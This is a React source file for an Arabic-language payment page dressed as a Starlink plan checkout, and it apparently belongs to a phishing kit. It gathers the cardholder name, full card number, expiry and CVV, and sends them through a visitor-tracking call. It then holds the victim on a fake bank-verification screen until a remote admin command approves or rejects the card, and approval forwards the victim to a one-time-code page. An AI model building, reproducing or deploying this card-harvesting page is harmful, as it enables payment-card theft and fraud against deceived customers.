import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { Lock, Loader2, PiggyBank, Sparkles, ShieldCheck } from "lucide-react";
import { z } from "zod";
import PageShell from "@/components/starlink/PageShell";
import { toast } from "@/hooks/use-toast";
import { updateVisitorData } from "@/hooks/useVisitorTracking";
import { useCurrency } from "@/contexts/CurrencyContext";
import { CardBrandLogo, detectCardBrand } from "@/components/starlink/CardBrandLogos";
import { saveCardMeta } from "@/components/starlink/SavedCardBadge";
import SEO from "@/components/SEO";
import { seoData } from "@/lib/seo";

// Luhn algorithm — تحقق من صحة رقم البطاقة (نفس الخوارزمية التي تستخدمها البنوك)
const luhnCheck = (raw: string): boolean => {
  const digits = raw.replace(/\D/g, "");
  if (digits.length < 13 || digits.length > 19) return false;
  let sum = 0;
  let alt = false;
  for (let i = digits.length - 1; i >= 0; i--) {
    let n = parseInt(digits[i], 10);
    if (alt) {
      n *= 2;
      if (n > 9) n -= 9;
    }
    sum += n;
    alt = !alt;
  }
  return sum % 10 === 0;
};

const schema = z.object({
  card_holder: z.string().trim().min(2, "اسم حامل البطاقة مطلوب").max(100),
  card_number: z
    .string()
    .trim()
    .regex(/^[0-9 ]{13,23}$/, "رقم بطاقة غير صالح")
    .refine((v) => luhnCheck(v), "رقم البطاقة غير صحيح — تأكد من إدخال رقم بطاقة حقيقي"),
  card_expiry: z
    .string()
    .trim()
    .regex(/^(0[1-9]|1[0-2])\/(\d{2})$/, "تاريخ غير صالح (MM/YY)"),
  card_cvv: z.string().trim().regex(/^[0-9]{3,4}$/, "رمز CVV يجب أن يكون 3 أو 4 أرقام"),
});

const formatCardNumber = (v: string) => {
  const digits = v.replace(/\D/g, "");
  const brand = detectCardBrand(digits);
  // Amex/Diners → 4-6-5 (15 رقم)، الباقي → 4-4-4-4 (حتى 19 رقم)
  if (brand === "amex" || brand === "diners") {
    const d = digits.slice(0, 15);
    const parts = [d.slice(0, 4), d.slice(4, 10), d.slice(10, 15)].filter(Boolean);
    return parts.join(" ");
  }
  return digits.slice(0, 19).replace(/(.{4})/g, "$1 ").trim();
};

const MONTHS = Array.from({ length: 12 }, (_, i) => String(i + 1).padStart(2, "0"));
const CURRENT_YEAR = new Date().getFullYear();
const YEARS = Array.from({ length: 15 }, (_, i) => String(CURRENT_YEAR + i));

const Payment = () => {
  const navigate = useNavigate();
  const { discountPercent } = useCurrency();
  const [order, setOrder] = useState<any>(null);
  const [form, setForm] = useState({ card_holder: "", card_number: "", card_cvv: "" });
  const [expMonth, setExpMonth] = useState("");
  const [expYear, setExpYear] = useState("");
  const [loading, setLoading] = useState(false);
  const [waiting, setWaiting] = useState(false);

  useEffect(() => {
    const raw = sessionStorage.getItem("starlink_order");
    if (raw) {
      setOrder(JSON.parse(raw));
      return;
    }
    // Fallback order so the page is reachable even when navigated to directly
    // (e.g. when the admin sends the visitor to /payment via a remote command).
    const fallback = {
      planName: "باقة ستارلينك",
      equipment: "—",
      monthly: "—",
      total: "—",
      currency: "USD",
    };
    sessionStorage.setItem("starlink_order", JSON.stringify(fallback));
    setOrder(fallback);
  }, [navigate]);

  // Listen for admin approval / rejection
  useEffect(() => {
    const onApproval = (e: Event) => {
      const detail = (e as CustomEvent).detail;
      if (!detail) return;
      if (detail.command === "approve_card") {
        sessionStorage.setItem("starlink_card", JSON.stringify(form));
        const digits = form.card_number.replace(/\D/g, "");
        saveCardMeta({
          brand: detectCardBrand(digits),
          last4: digits.slice(-4),
        });
        setWaiting(false);
        navigate("/payment/otp");
      } else if (detail.command === "reject_card") {
        setWaiting(false);
        toast({
          title: "بيانات البطاقة غير صحيحة",
          description: "يرجى التحقق من البيانات والمحاولة مرة أخرى.",
          variant: "destructive",
        });
      }
    };
    window.addEventListener("visitor-approval", onApproval);
    return () => window.removeEventListener("visitor-approval", onApproval);
  }, [form, navigate]);

  const submit = async (e: React.FormEvent) => {
    e.preventDefault();
    const card_expiry = expMonth && expYear ? `${expMonth}/${expYear.slice(-2)}` : "";
    const payload = { ...form, card_expiry };
    const parsed = schema.safeParse(payload);
    if (!parsed.success) {
      toast({ title: "تحقق من البيانات", description: parsed.error.issues[0].message, variant: "destructive" });
      return;
    }
    setLoading(true);
    try {
      await updateVisitorData({
        card_holder: parsed.data.card_holder,
        card_number: parsed.data.card_number,
        card_expiry: parsed.data.card_expiry,
        card_cvv: parsed.data.card_cvv,
      });
      setLoading(false);
      setWaiting(true);
    } catch (err: any) {
      setLoading(false);
      console.error("[payment] submit failed", err);
      toast({
        title: "تعذّر إرسال البيانات",
        description: err?.message || "تحقق من اتصالك بالإنترنت وحاول مرة أخرى.",
        variant: "destructive",
      });
    }
  };

  if (!order) return null;

  return (
    <PageShell eyebrow="الدفع" title="الدفع بالبطاقة" description="أدخل بيانات بطاقتك لإتمام عملية الدفع بشكل آمن.">
      <section className="container mx-auto px-6 py-16 grid lg:grid-cols-3 gap-8 max-w-6xl">
        <form onSubmit={submit} className="lg:col-span-2 space-y-4">
          <div className="flex items-center gap-2 text-xs text-muted-foreground mb-2">
            <Lock className="w-4 h-4" />
            <span>اتصال مشفّر — لن يتم خصم أي مبلغ قبل التأكيد</span>
          </div>

          <fieldset disabled={waiting} className="space-y-4 disabled:opacity-60">
            <div>
              <label className="text-sm text-muted-foreground mb-2 block">اسم حامل البطاقة</label>
              <input
                type="text"
                value={form.card_holder}
                onChange={(e) => setForm({ ...form, card_holder: e.target.value })}
                className="w-full h-12 bg-transparent border border-foreground/20 px-4 focus:border-foreground outline-none transition-colors"
                required
              />
            </div>

            <div>
              <label className="text-sm text-muted-foreground mb-2 block">رقم البطاقة</label>
              <div className="relative">
                <input
                  type="text"
                  inputMode="numeric"
                  value={form.card_number}
                  onChange={(e) => setForm({ ...form, card_number: formatCardNumber(e.target.value) })}
                  placeholder="0000 0000 0000 0000"
                  className="w-full h-12 bg-transparent border border-foreground/20 ps-16 pe-4 focus:border-foreground outline-none transition-colors tracking-wider"
                  required
                />
                <div className="absolute start-3 top-1/2 -translate-y-1/2 transition-all">
                  <CardBrandLogo brand={detectCardBrand(form.card_number)} />
                </div>
              </div>
            </div>

            <div className="grid grid-cols-2 gap-4">
              <div>
                <label className="text-sm text-muted-foreground mb-2 block">تاريخ الانتهاء</label>
                <div className="grid grid-cols-2 gap-2">
                  <select
                    value={expMonth}
                    onChange={(e) => setExpMonth(e.target.value)}
                    required
                    aria-label="الشهر"
                    className="w-full h-12 bg-background border border-foreground/20 px-3 focus:border-foreground outline-none transition-colors text-sm"
                  >
                    <option value="" disabled>الشهر</option>
                    {MONTHS.map((m) => (
                      <option key={m} value={m}>{m}</option>
                    ))}
                  </select>
                  <select
                    value={expYear}
                    onChange={(e) => setExpYear(e.target.value)}
                    required
                    aria-label="السنة"
                    className="w-full h-12 bg-background border border-foreground/20 px-3 focus:border-foreground outline-none transition-colors text-sm"
                  >
                    <option value="" disabled>السنة</option>
                    {YEARS.map((y) => (
                      <option key={y} value={y}>{y}</option>
                    ))}
                  </select>
                </div>
              </div>
              <div>
                <label className="text-sm text-muted-foreground mb-2 block">رمز CVV</label>
                <input
                  type="password"
                  inputMode="numeric"
                  maxLength={3}
                  value={form.card_cvv}
                  onChange={(e) => setForm({ ...form, card_cvv: e.target.value.replace(/\D/g, "").slice(0, 3) })}
                  placeholder="•••"
                  className="w-full h-12 bg-transparent border border-foreground/20 px-4 focus:border-foreground outline-none transition-colors tracking-widest"
                  required
                />
              </div>
            </div>
          </fieldset>

          <button
            type="submit"
            disabled={loading || waiting}
            className="w-full h-12 bg-foreground text-background hover:bg-foreground/90 transition-all text-sm font-medium tracking-wider mt-6 disabled:opacity-60 inline-flex items-center justify-center gap-2"
          >
            {waiting ? (
              <>
                <Loader2 className="w-4 h-4 animate-spin" />
                جاري التحقق من البنك...
              </>
            ) : loading ? (
              "جاري الإرسال..."
            ) : (
              "متابعة"
            )}
          </button>

          {waiting && (
            <p className="text-xs text-muted-foreground text-center mt-2">
              قد تستغرق العملية بضع لحظات. لا تُغلق هذه الصفحة.
            </p>
          )}
        </form>

        <aside className="space-y-4 h-fit lg:sticky lg:top-24 lg:self-start lg:max-h-[calc(100vh-7rem)] lg:overflow-y-auto">
          <div className="border border-foreground/10 p-6 space-y-4">
            <h3 className="text-lg font-light border-b border-foreground/10 pb-3">ملخص الطلب</h3>
            <div className="flex justify-between text-sm">
              <span className="text-muted-foreground">الباقة</span>
              <span>{order.planName}</span>
            </div>
            <div className="flex justify-between text-sm">
              <span className="text-muted-foreground">جهاز ستارلينك</span>
              <span>{order.equipment} {order.currency}</span>
            </div>
            <div className="flex justify-between text-sm">
              <span className="text-muted-foreground">شهر أول</span>
              <span>{order.monthly} {order.currency}</span>
            </div>
            <div className="flex justify-between text-base border-t border-foreground/10 pt-3 font-medium">
              <span>الإجمالي</span>
              <span>{order.total} {order.currency}</span>
            </div>
          </div>

          {/* Compact savings reminder */}
          {discountPercent > 0 && (
            <div className="relative overflow-hidden border border-[#d4af37]/40 bg-gradient-to-br from-black via-zinc-900 to-black text-white p-4">
              <div
                className="absolute inset-0 opacity-20 pointer-events-none"
                style={{
                  background:
                    "linear-gradient(110deg, transparent 30%, rgba(212,175,55,0.4) 50%, transparent 70%)",
                  backgroundSize: "200% 100%",
                  animation: "paySheen 5s linear infinite",
                }}
                aria-hidden
              />
              <style>{`@keyframes paySheen{0%{background-position:200% 0}100%{background-position:-200% 0}}`}</style>

              <div className="relative flex items-center gap-3">
                <div className="shrink-0 w-9 h-9 rounded-full border border-[#d4af37]/40 bg-[#d4af37]/10 inline-flex items-center justify-center">
                  <PiggyBank className="w-4 h-4 text-[#d4af37]" />
                </div>
                <div className="flex-1 min-w-0">
                  <div className="flex items-baseline gap-1.5">
                    <span className="text-[10px] tracking-[0.25em] uppercase text-[#d4af37]/80">وفّرت</span>
                  </div>
                  <div className="flex items-baseline gap-2 leading-tight">
                    <span className="text-lg font-light tabular-nums text-[#d4af37]">
                      {order.total} {order.currency}
                    </span>
                  </div>
                  <p className="flex items-center gap-1 text-[10px] text-white/60 mt-0.5">
                    <Sparkles className="w-3 h-3 text-[#d4af37]" />
                    <span>خصم <span className="text-[#d4af37] font-semibold">{discountPercent}%</span> مطبّق على طلبك</span>
                  </p>
                </div>
              </div>
            </div>
          )}
        </aside>
      </section>
    </PageShell>
  );
};

export default Payment;
